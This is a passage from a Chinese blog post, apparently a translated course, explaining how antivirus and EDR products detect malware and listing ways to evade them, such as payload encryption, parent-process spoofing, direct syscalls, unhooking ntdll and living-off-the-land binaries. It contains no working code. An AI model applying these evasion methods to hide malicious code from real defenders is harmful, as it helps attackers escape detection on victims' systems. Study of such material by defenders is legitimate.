

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="模块 1 – AV&#x2F;EDR 架构AV&#x2F;EDR规避实用技术 - 1.1 - 检测类型：签名检测、启发式检测、行为检测和机器学习现代的AV（防病毒）和EDR（端点检测与响应）系统采用多种检测方法来识别和阻止恶意活动。理解这些检测类型对于制定有效的规避策略至关重要。">
<meta property="og:type" content="article">
<meta property="og:title" content="AV&#x2F;EDR规避实用技术">
<meta property="og:url" content="https://sh1yan.top/2025/12/09/Practical-AVEDR-Evasion-Techniques/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="模块 1 – AV&#x2F;EDR 架构AV&#x2F;EDR规避实用技术 - 1.1 - 检测类型：签名检测、启发式检测、行为检测和机器学习现代的AV（防病毒）和EDR（端点检测与响应）系统采用多种检测方法来识别和阻止恶意活动。理解这些检测类型对于制定有效的规避策略至关重要。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://images.coursestack.com/3e9e0212-81dc-49ed-9233-ec9ca894fc6a/ad4cffa7-46ea-4339-9f05-a388754532ff">
<meta property="article:published_time" content="2025-12-09T15:50:55.000Z">
<meta property="article:modified_time" content="2025-12-09T09:02:58.715Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="免杀培训">
<meta property="article:tag" content="免杀技术">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://images.coursestack.com/3e9e0212-81dc-49ed-9233-ec9ca894fc6a/ad4cffa7-46ea-4339-9f05-a388754532ff">
  
  
  
  <title>AV/EDR规避实用技术 - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我开源的安全项目</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
                    
                    <span>SQLMap命令生成器</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/cvssjs/" target="_self">
                    
                    <span>CVSSv3.1 漏洞评分</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="AV/EDR规避实用技术"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-12-09 23:50" pubdate>
          2025年12月9日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          203k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          1694 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">AV/EDR规避实用技术</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="模块-1-–-AV-EDR-架构"><a href="#模块-1-–-AV-EDR-架构" class="headerlink" title="模块 1 – AV&#x2F;EDR 架构"></a>模块 1 – AV&#x2F;EDR 架构</h1><h2 id="AV-EDR规避实用技术-1-1-检测类型：签名检测、启发式检测、行为检测和机器学习"><a href="#AV-EDR规避实用技术-1-1-检测类型：签名检测、启发式检测、行为检测和机器学习" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 1.1 - 检测类型：签名检测、启发式检测、行为检测和机器学习"></a><strong>AV&#x2F;EDR规避实用技术 - 1.1 - 检测类型：签名检测、启发式检测、行为检测和机器学习</strong></h2><p>现代的AV（防病毒）和EDR（端点检测与响应）系统采用多种检测方法来识别和阻止恶意活动。理解这些检测类型对于制定有效的规避策略至关重要。</p>
<hr>
<span id="more"></span>
<h3 id="1-1-1-签名检测"><a href="#1-1-1-签名检测" class="headerlink" title="1.1.1 签名检测"></a>1.1.1 签名检测</h3><p><strong>定义：</strong><br>签名检测依赖于已知的恶意代码模式——如二进制字符串、哈希值或特定的指令序列——来识别威胁。</p>
<p><strong>工作原理：</strong></p>
<ul>
<li><p>AV引擎维护着大量的病毒签名数据库。</p>
</li>
<li><p>对传入的文件进行扫描，并与这些签名进行比对。</p>
</li>
<li><p>如果找到匹配项，文件会被标记为恶意文件。</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<ul>
<li><p>已知的Meterpreter有效载荷的SHA-256哈希。</p>
</li>
<li><p>Cobalt Strike beacon阶段的字节模式。</p>
</li>
</ul>
<p><strong>局限性：</strong></p>
<ul>
<li><p>容易通过以下方式绕过：</p>
<ul>
<li><p>对代码进行小幅修改（变形）。</p>
</li>
<li><p>混淆、加密或打包。</p>
</li>
<li><p>对有效载荷进行编码（如Base64、XOR）。</p>
</li>
</ul>
</li>
<li><p>无法检测新型或零日恶意软件。</p>
</li>
</ul>
<p><strong>规避技术：</strong></p>
<ul>
<li><p>Shellcode重新编码或加密。</p>
</li>
<li><p>使用“Stub”封装生成新的哈希值。</p>
</li>
<li><p>使用打包工具或加密工具。</p>
</li>
</ul>
<hr>
<h3 id="1-1-2-启发式检测"><a href="#1-1-2-启发式检测" class="headerlink" title="1.1.2 启发式检测"></a>1.1.2 启发式检测</h3><p><strong>定义：</strong><br>启发式检测通过对代码进行静态和动态的规则检查，寻找可疑的特征或行为。</p>
<p><strong>工作原理：</strong></p>
<ul>
<li><p>使用预定义的规则或类似YARA的模式检查。</p>
</li>
<li><p>寻找可疑的构造：</p>
<ul>
<li><p>API调用（如VirtualAllocEx、WriteProcessMemory）。</p>
</li>
<li><p>异常的节名或权限（如.text标记为RWX）。</p>
</li>
<li><p>高熵值，表明可能是加密或打包的文件。</p>
</li>
</ul>
</li>
</ul>
<p><strong>示例：</strong></p>
<ul>
<li><p>PE文件中的.text节很小，而.data节很大。</p>
</li>
<li><p>使用IsDebuggerPresent() API。</p>
</li>
<li><p>非标准文件头或修改过的PE元数据。</p>
</li>
</ul>
<p><strong>局限性：</strong></p>
<ul>
<li><p>可能导致误报。</p>
</li>
<li><p>可以通过随机化结构、重命名节或使用合法Windows API的控制方式来绕过。</p>
</li>
</ul>
<p><strong>规避技术：</strong></p>
<ul>
<li><p>填充有效载荷以降低熵值。</p>
</li>
<li><p>混淆API调用或延迟加载。</p>
</li>
<li><p>将恶意逻辑分拆成多个阶段。</p>
</li>
</ul>
<hr>
<h3 id="1-1-3-行为检测"><a href="#1-1-3-行为检测" class="headerlink" title="1.1.3 行为检测"></a>1.1.3 行为检测</h3><p><strong>定义：</strong><br>行为检测通过监控进程的运行时行为，并将其与已知的恶意行为模式进行关联。</p>
<p><strong>工作原理：</strong></p>
<ul>
<li><p>在实时或近实时模式下运行。</p>
</li>
<li><p>跟踪系统调用、API链、内存操作、进程创建、文件和注册表更改。</p>
</li>
</ul>
<p><strong>可疑行为示例：</strong></p>
<ul>
<li><p>CreateProcess → 注入Shellcode → CreateRemoteThread。</p>
</li>
<li><p>从MS Office或浏览器中生成的子进程。</p>
</li>
<li><p>修改自启动注册表键或计划任务。</p>
</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li><p>根据行为而非代码检测零日恶意软件。</p>
</li>
<li><p>难以通过模仿合法进程行为来规避。</p>
</li>
</ul>
<p><strong>规避技术：</strong></p>
<ul>
<li><p>睡眠&#x2F;延迟战术（例如：Sleep(10000)）。</p>
</li>
<li><p>父进程伪装（PPID伪装）。</p>
</li>
<li><p>分阶段投递有效载荷，保持内存占用最小。</p>
</li>
<li><p>在API调用序列中插入良性假象。</p>
</li>
</ul>
<hr>
<h3 id="1-1-4-基于机器学习（ML）的检测"><a href="#1-1-4-基于机器学习（ML）的检测" class="headerlink" title="1.1.4 基于机器学习（ML）的检测"></a>1.1.4 基于机器学习（ML）的检测</h3><p><strong>定义：</strong><br>机器学习检测通过对大量良性和恶意行为数据集进行模型训练，来识别异常或类似恶意软件的行为模式。</p>
<p><strong>工作原理：</strong></p>
<ul>
<li><p>使用有监督、无监督或深度学习模型。</p>
</li>
<li><p>输入数据可能包括：</p>
<ul>
<li><p>API调用序列模式。</p>
</li>
<li><p>熵值。</p>
</li>
<li><p>文件元数据和PE头特征。</p>
</li>
<li><p>内存结构快照。</p>
</li>
</ul>
</li>
</ul>
<p><strong>示例：</strong></p>
<ul>
<li><p>模型检测到新编译的EXE中的异常系统调用模式。</p>
</li>
<li><p>标记一个具有高熵.text节和可疑导入的可执行文件。</p>
</li>
</ul>
<p><strong>挑战：</strong></p>
<ul>
<li><p>黑盒特性使其难以理解或进行测试。</p>
</li>
<li><p>高计算成本和易受到对抗性机器学习攻击的影响。</p>
</li>
</ul>
<p><strong>规避技术：</strong></p>
<ul>
<li><p>对抗性输入构造：插入无害噪声（垃圾API调用、假字符串）。</p>
</li>
<li><p>使用已知的良性行为（如模仿explorer.exe的行为）。</p>
</li>
<li><p>模拟良性软件的熵值和结构。</p>
</li>
</ul>
<hr>
<p><strong>总结表：</strong></p>
<table>
<thead>
<tr>
<th>检测类型</th>
<th>方法</th>
<th>优势</th>
<th>弱点</th>
</tr>
</thead>
<tbody><tr>
<td>签名检测</td>
<td>哈希&#x2F;模式匹配</td>
<td>对已知威胁快速且可靠</td>
<td>无法检测未知或混淆的威胁</td>
</tr>
<tr>
<td>启发式检测</td>
<td>基于规则</td>
<td>能够发现可疑的代码特征</td>
<td>可能产生误报</td>
</tr>
<tr>
<td>行为检测</td>
<td>运行时监控</td>
<td>根据行为检测零日威胁，难以规避</td>
<td>可通过时序技巧绕过</td>
</tr>
<tr>
<td>机器学习（ML）检测</td>
<td>模式预测</td>
<td>自适应且具有前瞻性</td>
<td>容易受到对抗性输入的欺骗</td>
</tr>
</tbody></table>
<h2 id="AV-EDR规避实用技术-1-2-EDR的核心组件：传感器、驱动程序、用户空间、后台和云"><a href="#AV-EDR规避实用技术-1-2-EDR的核心组件：传感器、驱动程序、用户空间、后台和云" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 1.2 - EDR的核心组件：传感器、驱动程序、用户空间、后台和云"></a><strong>AV&#x2F;EDR规避实用技术 - 1.2 - EDR的核心组件：传感器、驱动程序、用户空间、后台和云</strong></h2><p>端点检测与响应（EDR）平台是由多个相互依赖的层级构成的复杂系统。每一层在潜在威胁的检测、记录、分析和响应中都扮演着关键角色。理解这些组件对于识别规避检测的方式至关重要。</p>
<hr>
<h3 id="1-2-1-传感器"><a href="#1-2-1-传感器" class="headerlink" title="1.2.1 传感器"></a><strong>1.2.1 传感器</strong></h3><p><strong>定义：</strong><br>传感器是安装在端点上的轻量级软件组件，负责实时收集遥测数据并监控行为。</p>
<p><strong>职责：</strong></p>
<ul>
<li><p>钩取API调用和系统函数。</p>
</li>
<li><p>捕捉进程创建、文件访问、注册表更改、内存注入等活动。</p>
</li>
<li><p>收集日志并将数据发送到后台&#x2F;云端。</p>
</li>
</ul>
<p><strong>特点：</strong></p>
<ul>
<li><p>可在用户模式和内核模式下运行。</p>
</li>
<li><p>通常具有隐蔽性和抗篡改性。</p>
</li>
<li><p>通常是攻击者接触的第一个接触点。</p>
</li>
</ul>
<p><strong>规避考虑：</strong></p>
<ul>
<li><p>针对DLL卸载和API重定向进行攻击。</p>
</li>
<li><p>使用系统调用级别的规避技术绕过传感器逻辑。</p>
</li>
</ul>
<hr>
<h3 id="1-2-2-内核驱动程序"><a href="#1-2-2-内核驱动程序" class="headerlink" title="1.2.2 内核驱动程序"></a><strong>1.2.2 内核驱动程序</strong></h3><p><strong>定义：</strong><br>驱动程序在<strong>Ring 0</strong>级别操作，提供与操作系统内核的深度集成，以监控低级操作。</p>
<p><strong>职责：</strong></p>
<ul>
<li><p>拦截系统调用、IRP（I&#x2F;O请求包）和内核回调。</p>
</li>
<li><p>监控进程&#x2F;线程创建、内存映射和设备访问。</p>
</li>
<li><p>实施进程保护（防止篡改EDR进程）。</p>
</li>
</ul>
<p><strong>典型功能：</strong></p>
<ul>
<li><p>ETW（Windows事件跟踪）集成。</p>
</li>
<li><p>文件系统迷你过滤器。</p>
</li>
<li><p>通过<code>CmRegisterCallbackEx</code>注册的注册表回调。</p>
</li>
</ul>
<p><strong>规避考虑：</strong></p>
<ul>
<li><p>难以直接绕过，除非利用漏洞。</p>
</li>
<li><p>可以通过直接系统调用或未记录的NT函数绕过。</p>
</li>
<li><p>有时使用rootkit或签名的易受攻击驱动程序进行驱动级规避。</p>
</li>
</ul>
<hr>
<h3 id="1-2-3-用户空间组件"><a href="#1-2-3-用户空间组件" class="headerlink" title="1.2.3 用户空间组件"></a><strong>1.2.3 用户空间组件</strong></h3><p><strong>定义：</strong><br>这些组件在用户模式下运行，直接与操作系统API和应用程序交互。</p>
<p><strong>职责：</strong></p>
<ul>
<li><p>钩取WinAPI函数（例如通过<code>IAT</code>、内联钩子、<code>Detours</code>）。</p>
</li>
<li><p>监控常见API调用（例如<code>CreateRemoteThread</code>、<code>VirtualAllocEx</code>）。</p>
</li>
<li><p>收集元数据和用户活动信息。</p>
</li>
</ul>
<p><strong>使用的工具：</strong></p>
<ul>
<li><p>DLL注入（注入到explorer.exe或浏览器进程中）。</p>
</li>
<li><p>沙箱或内存分析。</p>
</li>
</ul>
<p><strong>规避考虑：</strong></p>
<ul>
<li><p>使用未钩取的ntdll.dll副本或直接进行系统调用。</p>
</li>
<li><p>使用时序攻击延迟执行，避免被分析窗口捕获。</p>
</li>
<li><p>使用良性父进程名称进行进程空洞化（Process Hollowing）。</p>
</li>
</ul>
<hr>
<h3 id="1-2-4-后台（本地或混合模式）"><a href="#1-2-4-后台（本地或混合模式）" class="headerlink" title="1.2.4 后台（本地或混合模式）"></a><strong>1.2.4 后台（本地或混合模式）</strong></h3><p><strong>定义：</strong><br>后台是接收并处理来自所有端点遥测数据的基础设施。</p>
<p><strong>职责：</strong></p>
<ul>
<li><p>聚合来自端点的日志和事件。</p>
</li>
<li><p>应用关联规则和威胁检测逻辑。</p>
</li>
<li><p>提供警报和取证分析功能。</p>
</li>
</ul>
<p><strong>常用技术：</strong></p>
<ul>
<li><p>SIEM（例如Splunk、ELK）。</p>
</li>
<li><p>XDR平台。</p>
</li>
<li><p>基于图的关联引擎。</p>
</li>
</ul>
<p><strong>规避考虑：</strong></p>
<ul>
<li><p>在多个主机之间混合行为，避免模式匹配。</p>
</li>
<li><p>避免生成高保真度的指示器（例如已知的C2域）。</p>
</li>
<li><p>加密或编码通信以隐藏有效载荷的意图。</p>
</li>
</ul>
<hr>
<h3 id="1-2-5-云组件"><a href="#1-2-5-云组件" class="headerlink" title="1.2.5 云组件"></a><strong>1.2.5 云组件</strong></h3><p><strong>定义：</strong><br>现代EDR解决方案使用云基础设施进行集中智能分析、分析和更新。</p>
<p><strong>职责：</strong></p>
<ul>
<li><p>卸载繁重的处理任务（例如机器学习分析、沙箱分析）。</p>
</li>
<li><p>分发更新的签名、行为规则和威胁情报。</p>
</li>
<li><p>提供仪表盘和远程管理功能。</p>
</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li><p>可扩展性和全球可见性。</p>
</li>
<li><p>实时更新和自动响应。</p>
</li>
</ul>
<p><strong>规避考虑：</strong></p>
<ul>
<li><p>为了避免云端警报，必须在端点级别保持隐蔽性。</p>
</li>
<li><p>云端仍然可以通过元数据而非有效载荷内容检测异常。</p>
</li>
<li><p>通过具有环境感知能力的恶意软件可以避免云沙箱分析。</p>
</li>
</ul>
<hr>
<p><strong>EDR数据流概览：</strong></p>
<p><img src="https://images.coursestack.com/3e9e0212-81dc-49ed-9233-ec9ca894fc6a/ad4cffa7-46ea-4339-9f05-a388754532ff" srcset="/img/loading.gif" lazyload></p>
<p>图 1 - 数据流概览</p>
<hr>
<p> <strong>EDR 组件及其角色概述</strong></p>
<table>
<thead>
<tr>
<th>组件</th>
<th>层级</th>
<th>角色</th>
<th>绕过重点领域</th>
</tr>
</thead>
<tbody><tr>
<td>传感器</td>
<td>终端</td>
<td>捕获 API&#x2F;系统事件</td>
<td>系统调用使用、API 隐藏、DLL 卸钩</td>
</tr>
<tr>
<td>内核驱动</td>
<td>内核</td>
<td>拦截系统调用，保护进程</td>
<td>直接系统调用、Rootkit 技术</td>
</tr>
<tr>
<td>用户空间</td>
<td>应用程序</td>
<td>监控 API 和用户行为</td>
<td>NTDLL 补丁、延迟执行</td>
</tr>
<tr>
<td>后端</td>
<td>服务器端</td>
<td>分析遥测，生成警报</td>
<td>减少指标、编码流量</td>
</tr>
<tr>
<td>云</td>
<td>外部</td>
<td>机器学习、沙箱、威胁情报</td>
<td>环境检测、定时延迟</td>
</tr>
</tbody></table>
<h2 id="AV-EDR-绕过实用技术-1-3-实时检测与事后检测"><a href="#AV-EDR-绕过实用技术-1-3-实时检测与事后检测" class="headerlink" title="AV&#x2F;EDR 绕过实用技术 - 1.3 - 实时检测与事后检测"></a>AV&#x2F;EDR 绕过实用技术 - 1.3 - 实时检测与事后检测</h2><p>理解 EDR（端点检测与响应）有效性的一个基础概念是区分 <strong>实时检测</strong> 和 <strong>事后检测</strong>。这种分类定义了 <strong>威胁</strong> 是在 <strong>执行过程中</strong>（实时）还是在恶意活动已经发生之后（事后）被识别。对于绕过技术来说，了解这一区别使攻击者和防御者可以根据需要调整或伪装操作的时机。</p>
<hr>
<h3 id="1-3-1-什么是实时检测？"><a href="#1-3-1-什么是实时检测？" class="headerlink" title="1.3.1 什么是实时检测？"></a><strong>1.3.1 什么是实时检测？</strong></h3><p><strong>定义：</strong><br>实时检测指的是安全系统在 <strong>事件发生时</strong> 检测并可能 <strong>阻止或隔离</strong> 恶意活动的能力。</p>
<p><strong>关键特征：</strong></p>
<ul>
<li><p>即时事件处理（毫秒级别）。</p>
</li>
<li><p>侧重于 <strong>预防</strong> 和 <strong>主动防御</strong>。</p>
</li>
<li><p>基于 API 钩子、行为签名、启发式分析和内核回调。</p>
</li>
<li><p>通常与操作系统机制紧密集成，如 ETW（Windows 事件追踪）、内核过滤器或用户空间 API 拦截。</p>
</li>
</ul>
<p><strong>实时触发示例：</strong></p>
<ul>
<li><p>调用 <code>CreateRemoteThread</code> 或 <code>NtWriteVirtualMemory</code>。</p>
</li>
<li><p>标记为 RWX（可读、可写、可执行）的内存段。</p>
</li>
<li><p>DLL 侧加载或镜像篡改。</p>
</li>
<li><p>从可疑目录（例如临时文件夹）执行不受信任的文件。</p>
</li>
</ul>
<p><strong>对攻击者的影响：</strong></p>
<ul>
<li><p>绕过行为必须发生 <strong>在</strong> 检测触发之前。</p>
</li>
<li><p>可以利用 <strong>延迟执行</strong>、<strong>进程注入后睡眠</strong> 或 <strong>系统调用滥用</strong> 来帮助绕过。</p>
</li>
<li><p>目标是 <strong>完全避免触发钩子或传感器</strong>。</p>
</li>
</ul>
<hr>
<h3 id="1-3-2-什么是事后检测？"><a href="#1-3-2-什么是事后检测？" class="headerlink" title="1.3.2 什么是事后检测？"></a><strong>1.3.2 什么是事后检测？</strong></h3><p><strong>定义：</strong><br>事后检测指的是在恶意活动 <strong>执行后</strong> 分析 <strong>收集到的遥测数据</strong> 并识别可疑或恶意行为。</p>
<p><strong>关键特征：</strong></p>
<ul>
<li><p>依赖于存储的日志、元数据或行为关联。</p>
</li>
<li><p>侧重于 <strong>取证调查</strong>、<strong>威胁狩猎</strong> 和 <strong>响应</strong>。</p>
</li>
<li><p>通常在 EDR 的后端、SIEM 系统或云端分析中实现。</p>
</li>
</ul>
<p><strong>事后指示符示例：</strong></p>
<ul>
<li><p>异常的进程树（例如，Word 启动 PowerShell）。</p>
</li>
<li><p>可疑的注册表键更改或持久性伪造。</p>
</li>
<li><p>稀有或高熵的网络连接。</p>
</li>
<li><p>事后检测到已知恶意软件的哈希值。</p>
</li>
</ul>
<p><strong>对攻击者的影响：</strong></p>
<ul>
<li><p>目标是 <strong>最小化遗留的痕迹</strong>。</p>
</li>
<li><p>使用 <strong>生活在土地上</strong> 技术（LOLbins）和 <strong>无文件执行</strong> 帮助避免事后模式。</p>
</li>
<li><p><strong>元数据最小化</strong> 是关键：避免显眼。</p>
</li>
</ul>
<hr>
<h3 id="1-3-3-技术对比表"><a href="#1-3-3-技术对比表" class="headerlink" title="1.3.3 技术对比表"></a><strong>1.3.3 技术对比表</strong></h3><table>
<thead>
<tr>
<th>特征</th>
<th>实时检测</th>
<th>事后检测</th>
</tr>
</thead>
<tbody><tr>
<td>时间</td>
<td>执行期间</td>
<td>执行后</td>
</tr>
<tr>
<td>主要目标</td>
<td>预防&#x2F;阻止</td>
<td>检测&#x2F;调查</td>
</tr>
<tr>
<td>使用方法</td>
<td>API 钩子、ETW、回调、内核过滤器</td>
<td>日志分析、启发式分析、异常检测</td>
</tr>
<tr>
<td>常见技术</td>
<td>传感器驱动程序、ETW 消费者、API 拦截</td>
<td>SIEM、云关联器、威胁情报数据库</td>
</tr>
<tr>
<td>响应时间</td>
<td>毫秒</td>
<td>分钟到小时（或人工）</td>
</tr>
<tr>
<td>示例</td>
<td>阻止恶意 DLL 注入</td>
<td>执行后检测到编码 PowerShell</td>
</tr>
<tr>
<td>攻击者绕过策略</td>
<td>系统调用模糊化、跳过睡眠阶段、分阶段执行</td>
<td>清理、LOLbins、低调行为</td>
</tr>
</tbody></table>
<hr>
<h3 id="1-3-4-检测工作流示例"><a href="#1-3-4-检测工作流示例" class="headerlink" title="1.3.4 检测工作流示例"></a><strong>1.3.4 检测工作流示例</strong></h3><p><strong>实时检测示例流程：</strong></p>
<ol>
<li><p>攻击者使用 <code>VirtualAllocEx</code> + <code>WriteProcessMemory</code> + <code>CreateRemoteThread</code>。</p>
</li>
<li><p>传感器钩住的 API 调用触发。</p>
</li>
<li><p>EDR 标记该操作并在有效负载执行前阻止线程。</p>
</li>
</ol>
<p><strong>事后检测示例流程：</strong></p>
<ol>
<li><p>负载通过 <code>rundll32</code> 执行并调用自定义脚本。</p>
</li>
<li><p>执行在运行时看起来合法。</p>
</li>
<li><p>5 分钟后，云端分析检测到不寻常的命令行行为。</p>
</li>
<li><p>警报触发，但执行已经发生。</p>
</li>
</ol>
<hr>
<h3 id="1-3-5-混合检测系统（混合模型）"><a href="#1-3-5-混合检测系统（混合模型）" class="headerlink" title="1.3.5 混合检测系统（混合模型）"></a><strong>1.3.5 混合检测系统（混合模型）</strong></h3><p>大多数现代 EDR <strong>结合了实时和事后检测能力</strong>，以提供分层防御。</p>
<ul>
<li><p>实时检测用于 <strong>预防已知技术</strong>。</p>
</li>
<li><p>事后检测用于 <strong>检测新颖或模糊的行为</strong>。</p>
</li>
</ul>
<p><strong>安全厂商使用：</strong></p>
<ul>
<li><p>云端机器学习模型进行延迟异常检测。</p>
</li>
<li><p>跨用户&#x2F;机器的关联进行模式识别。</p>
</li>
<li><p>时间线重建和行为归因。</p>
</li>
</ul>
<hr>
<h3 id="1-3-6-绕过影响"><a href="#1-3-6-绕过影响" class="headerlink" title="1.3.6 绕过影响"></a><strong>1.3.6 绕过影响</strong></h3><p>为了绕过两种检测策略：</p>
<p><strong>针对实时检测：</strong></p>
<ul>
<li><p>避免已知的 API 调用序列。</p>
</li>
<li><p>使用直接系统调用（<code>syswhispers</code>、<code>hellsgate</code>）。</p>
</li>
<li><p>使用睡眠&#x2F;休眠阶段延迟有效负载。</p>
</li>
</ul>
<p><strong>针对事后检测：</strong></p>
<ul>
<li><p>避免创建永久性痕迹（文件、注册表、服务）。</p>
</li>
<li><p>执行后清理（注册表键、临时文件）。</p>
</li>
<li><p>使用本地 Windows 二进制文件（LOLBAS）。</p>
</li>
